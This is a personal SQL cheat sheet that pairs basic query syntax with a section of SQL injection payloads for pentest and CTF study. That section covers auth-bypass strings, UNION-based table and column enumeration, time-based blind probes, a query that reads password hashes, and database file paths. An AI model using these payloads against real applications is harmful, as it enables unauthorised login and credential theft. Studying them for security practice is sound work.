# SQL reference

Personal cheat sheet — SQL syntax for reading and modifying relational databases, plus the offensive-side patterns to recognise during pentests, CTFs, and forensics. Adds grow as I learn more.

## Read data

| Query | Purpose |
| --- | --- |
| `SELECT * FROM table;` | All columns, all rows |
| `SELECT col1, col2 FROM table;` | Specific columns only |
| `SELECT * FROM table WHERE col = 'value';` | Filter rows |
| `SELECT * FROM table WHERE col LIKE 'a%';` | Pattern match (`%` = any chars) |
| `SELECT * FROM table ORDER BY col;` | Sort ascending |
| `SELECT * FROM table ORDER BY col DESC;` | Sort descending |
| `SELECT COUNT(*) FROM table;` | Number of rows |
| `SELECT DISTINCT col FROM table;` | Unique values only |
| `SELECT * FROM table LIMIT 10;` | First 10 rows |

## Modify data

| Query | Purpose |
| --- | --- |
| `INSERT INTO table (col1, col2) VALUES ('a', 'b');` | Add a row |
| `UPDATE table SET col = 'value' WHERE id = 1;` | Change existing rows |
| `DELETE FROM table WHERE id = 1;` | Remove rows |

**Always use WHERE on UPDATE / DELETE.** Without it the change applies to every row.

## Joining tables

| Query | Purpose |
| --- | --- |
| `INNER JOIN` | Rows that exist in both tables |
| `LEFT JOIN` | All rows from the left table, matching rows from the right (NULL if no match) |
| `RIGHT JOIN` | All rows from the right table, matching rows from the left |
| `UNION` | Stack results of two SELECTs (must match column counts) |

Example:

```sql
SELECT u.username, o.product
FROM users u
INNER JOIN orders o ON u.id = o.user_id;
```

## Aggregation

| Function | Purpose |
| --- | --- |
| `COUNT(col)` | Number of non-NULL values |
| `SUM(col)` | Total |
| `AVG(col)` | Average |
| `MIN(col)`, `MAX(col)` | Smallest / largest |
| `GROUP BY col` | Bucket rows by a column for aggregation |

## Common database systems

| System | Where you see it |
| --- | --- |
| MySQL / MariaDB | Most web apps (WordPress, classic LAMP stack) |
| PostgreSQL | Enterprise, complex apps, anything needing advanced features |
| SQLite | Mobile apps, small tools, embedded systems. Single `.db` file. |
| MSSQL (SQL Server) | Microsoft enterprise environments |
| Oracle | Large legacy enterprise systems |

## SQL injection — patterns to recognise

### Auth bypass

Vulnerable query:

```sql
SELECT * FROM users WHERE username='⚠️' AND password='⚠️';
```

Classic payloads in the username field:

| Payload | Result |
| --- | --- |
| `' OR '1'='1` | `OR 1=1` always true, WHERE passes |
| `' OR 1=1 --` | `--` comments out the password check |
| `admin' --` | Logs in as admin with no password |
| `' OR 1=1 #` | MySQL comment variant |

### Data extraction

| Payload | Use |
| --- | --- |
| `' UNION SELECT username, password FROM users --` | Pull data from another table |
| `' UNION SELECT NULL, NULL --` | Find the column count first (add NULLs until no error) |
| `' AND 1=2 UNION SELECT table_name, NULL FROM information_schema.tables --` | Enumerate tables |
| `' AND 1=2 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --` | Enumerate columns |

### Blind SQLi indicators

No output? Look for:
- Different page response for true vs false conditions (`AND 1=1` vs `AND 1=2`)
- Time-based: `'; WAITFOR DELAY '0:0:5' --` (MSSQL), `'; SELECT SLEEP(5) --` (MySQL)
- Error messages leaking table / column names

### Useful info-schema queries (post-exploit)

```sql
-- list all databases
SELECT schema_name FROM information_schema.schemata;

-- list all tables in current database
SELECT table_name FROM information_schema.tables WHERE table_schema = database();

-- list columns for a specific table
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

-- read password hashes
SELECT username, password FROM users;
```

## Common database file paths

**Linux:**
- `/var/lib/mysql/` — MySQL / MariaDB data
- `/etc/mysql/my.cnf` — MySQL config
- `/var/lib/postgresql/` — PostgreSQL data
- `/etc/postgresql/` — PostgreSQL config
- Look for `*.sqlite`, `*.db`, `*.sql` files anywhere on disk for app-embedded databases

**Windows:**
- `C:\Program Files\MySQL\` — MySQL installs
- `C:\Program Files\Microsoft SQL Server\` — MSSQL data and config
- App-specific SQLite `.db` files often live under `C:\Users\<user>\AppData\`

## Hands-on practice

- [SQLZoo](https://sqlzoo.net/) — free interactive SQL exercises
- [PortSwigger Web Academy — SQL injection](https://portswigger.net/web-security/sql-injection) — the gold standard SQLi labs, free
- [HackTheBox — Academy SQL modules](https://academy.hackthebox.com/) — paid but high-quality

## Sources

- [TryHackMe — Database SQL Basics](https://tryhackme.com/room/databasesqlbasics)
